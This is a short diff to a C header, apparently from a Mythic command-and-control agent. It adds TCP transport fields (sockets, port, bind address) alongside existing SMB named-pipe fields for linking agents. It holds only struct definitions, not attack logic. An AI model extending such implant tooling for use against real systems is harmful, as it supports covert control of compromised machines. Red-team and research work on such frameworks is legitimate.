@@ -27,9 +27,11 @@ typedef struct _CALLBACK_NODE {
 typedef struct _LINKS {
     CHAR   TaskUuid[37];                    // Track Task that started Link
     UINT32 LinkId;                          // Link Id
+    UINT32 LinkType;                        // Link Type: 1 - SMB, 2 - TCP
     PCHAR  AgentId;                         // Mythic Id
     PCHAR  PipeName;                        // Named pipe string
     HANDLE hPipe;                           // Handle to link's named pipe
+    SOCKET LinkSocket;                      // TCP Socket of link
     BOOL   Connected;                       // Is link Alive
     struct LINKS* Next;                     // Pointer to the next node in the linked list
 } LINKS, *PLINKS;
@@ -71,6 +73,16 @@ typedef struct
     UINT32 SmbId;
     HANDLE SmbPipe;
     PCHAR  SmbPipename;
+
+#endif
+
+#if defined(TCP_TRANSPORT)
+
+    UINT32 TcpId;
+    SOCKET TcpSocketServer;
+    SOCKET TcpSocketClient;
+    UINT32  TcpPort;
+    PCHAR TcpBindAddress;  
 
 #endif
 
